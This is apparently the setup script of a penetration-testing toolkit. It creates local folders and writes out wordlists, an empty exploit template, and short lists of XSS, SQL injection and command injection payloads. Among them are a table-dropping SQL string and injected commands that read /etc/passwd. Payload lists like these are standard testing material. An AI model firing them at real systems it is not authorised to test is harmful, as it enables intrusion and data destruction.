"""
BlackCell Security Toolkit - Setup and Installation
"""

import os
import sys
import subprocess
import shutil
from pathlib import Path
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
from rich.panel import Panel
from rich.text import Text
import requests
import zipfile
import tarfile

console = Console()

class BlackCellSetup:
    def __init__(self):
        self.home_dir = Path.home() / ".blackcell"
        self.data_dir = self.home_dir / "data"
        self.payloads_dir = self.data_dir / "payloads"
        self.wordlists_dir = self.data_dir / "wordlists"
        self.exploits_dir = self.data_dir / "exploits"
        
    def create_directories(self):
        """Create all required directories"""
        directories = [
            self.home_dir,
            self.data_dir,
            self.payloads_dir,
            self.wordlists_dir,
            self.exploits_dir,
            self.home_dir / "output",
            self.home_dir / "logs",
            self.home_dir / "temp",
            self.home_dir / "config"
        ]
        
        for directory in directories:
            directory.mkdir(parents=True, exist_ok=True)
            
    def download_file(self, url: str, destination: Path, description: str = "Downloading"):
        """Download file with progress bar"""
        try:
            response = requests.get(url, stream=True)
            response.raise_for_status()
            
            total_size = int(response.headers.get('content-length', 0))
            
            with Progress(
                SpinnerColumn(),
                TextColumn(f"[bold blue]{description}"),
                BarColumn(),
                TaskProgressColumn(),
            ) as progress:
                task = progress.add_task("", total=total_size)
                
                with open(destination, 'wb') as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        if chunk:
                            f.write(chunk)
                            progress.update(task, advance=len(chunk))
            
            return True
        except Exception as e:
            console.print(f"[red]Error downloading {url}: {e}[/red]")
            return False
    
    def setup_payloads(self):
        """Setup default payloads"""
        console.print("\n[bold cyan]Setting up payloads...[/bold cyan]")
        
        # Common XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input type=image src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<video src=x onerror=alert('XSS')>"
        ]
        
        # SQL Injection payloads
        sqli_payloads = [
            "' OR 1=1--",
            "' OR '1'='1",
            "admin'--",
            "admin'/*",
            "' OR 1=1#",
            "'; DROP TABLE users; --",
            "' UNION SELECT NULL--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "' OR 'a'='a"
        ]
        
        # Command injection payloads
        cmd_payloads = [
            "; ls",
            "| whoami",
            "&& id",
            "|| cat /etc/passwd",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            "; id",
            "| id",
            "&& whoami"
        ]
        
        # Write payloads to files
        payloads = {
            "xss.txt": xss_payloads,
            "sqli.txt": sqli_payloads,
            "cmd_injection.txt": cmd_payloads
        }
        
        for filename, payload_list in payloads.items():
            payload_file = self.payloads_dir / filename
            with open(payload_file, 'w') as f:
                for payload in payload_list:
                    f.write(payload + "\n")
        
        console.print("[green]Payloads setup complete![/green]")
    
    def setup_wordlists(self):
        """Setup default wordlists"""
        console.print("\n[bold cyan]Setting up wordlists...[/bold cyan]")
        
        # Common directories
        directories = [
            "admin", "administrator", "login", "wp-admin", "phpmyadmin",
            "dashboard", "panel", "control", "manager", "backend",
            "api", "v1", "v2", "test", "dev", "backup", "old",
            "tmp", "temp", "cache", "config", "logs", "uploads"
        ]
        
        # Common subdomains
        subdomains = [
            "www", "mail", "ftp", "admin", "test", "dev", "staging",
            "api", "app", "web", "secure", "vpn", "remote", "portal",
            "blog", "shop", "store", "support", "help", "docs"
        ]
        
        # Common files
        files = [
            "index.html", "index.php", "login.php", "admin.php",
            "config.php", "database.php", "connect.php", "db.php",
            "backup.sql", "dump.sql", "users.sql", "config.txt",
            "robots.txt", "sitemap.xml", ".htaccess", "web.config"
        ]
        
        wordlists = {
            "directories.txt": directories,
            "subdomains.txt": subdomains,
            "files.txt": files
        }
        
        for filename, wordlist in wordlists.items():
            wordlist_file = self.wordlists_dir / filename
            with open(wordlist_file, 'w') as f:
                for word in wordlist:
                    f.write(word + "\n")
        
        console.print("[green]Wordlists setup complete![/green]")
    
    def setup_exploits(self):
        """Setup exploit templates and examples"""
        console.print("\n[bold cyan]Setting up exploit templates...[/bold cyan]")
        
        # Basic exploit template
        exploit_template = '''#!/usr/bin/env python3
"""
BlackCell Exploit Template
Target: [TARGET_NAME]
CVE: [CVE_ID]
Description: [DESCRIPTION]
"""

import requests
import sys
from blackcell.core.logger import setup_logger

class Exploit:
    def __init__(self, target_url, debug=False):
        self.target_url = target_url
        self.logger = setup_logger("exploit", debug=debug)
        
    def check_vulnerability(self):
        """Check if target is vulnerable"""
        try:
            # Implement vulnerability check
            pass
        except Exception as e:
            self.logger.error(f"Error checking vulnerability: {e}")
            return False
            
    def exploit(self):
        """Execute exploit"""
        try:
            if not self.check_vulnerability():
                self.logger.warning("Target does not appear to be vulnerable")
                return False
                
            # Implement exploit logic
            self.logger.info("Exploit executed successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Exploit failed: {e}")
            return False

def main():
    if len(sys.argv) < 2:
        print("Usage: exploit.py <target_url>")
        sys.exit(1)
        
    exploit = Exploit(sys.argv[1])
    exploit.exploit()

if __name__ == "__main__":
    main()
'''
        
        template_file = self.exploits_dir / "template.py"
        with open(template_file, 'w') as f:
            f.write(exploit_template)
        
        console.print("[green]Exploit templates setup complete![/green]")
    
    def install_dependencies(self):
        """Install required dependencies"""
        console.print("\n[bold cyan]Installing dependencies...[/bold cyan]")
        
        try:
            # Check if pip is available
            subprocess.run([sys.executable, "-m", "pip", "--version"], check=True, capture_output=True)
            
            # Install requirements
            requirements_path = Path(__file__).parent.parent.parent / "requirements.txt"
            if requirements_path.exists():
                cmd = [sys.executable, "-m", "pip", "install", "-r", str(requirements_path)]
                result = subprocess.run(cmd, capture_output=True, text=True)
                
                if result.returncode == 0:
                    console.print("[green]Dependencies installed successfully![/green]")
                else:
                    console.print(f"[red]Error installing dependencies: {result.stderr}[/red]")
            else:
                console.print("[yellow]Requirements file not found, skipping dependency installation[/yellow]")
                
        except subprocess.CalledProcessError:
            console.print("[red]pip not found, please install Python pip first[/red]")
        except Exception as e:
            console.print(f"[red]Error installing dependencies: {e}[/red]")

def run_setup():
    """Run the complete setup process"""
    console.print(Panel.fit(
        Text("BlackCell Security Toolkit Setup", style="bold red"),
        border_style="red"
    ))
    
    setup = BlackCellSetup()
    
    try:
        console.print("[bold cyan]Creating directories...[/bold cyan]")
        setup.create_directories()
        console.print("[green]Directories created successfully![/green]")
        
        setup.setup_payloads()
        setup.setup_wordlists()
        setup.setup_exploits()
        setup.install_dependencies()
        
        console.print("\n[bold green]Setup completed successfully![/bold green]")
        console.print("[cyan]You can now run 'blackcell' or 'bc-tui' to start the toolkit[/cyan]")
        
    except Exception as e:
        console.print(f"[red]Setup failed: {e}[/red]")
        sys.exit(1)

if __name__ == "__main__":
    run_setup()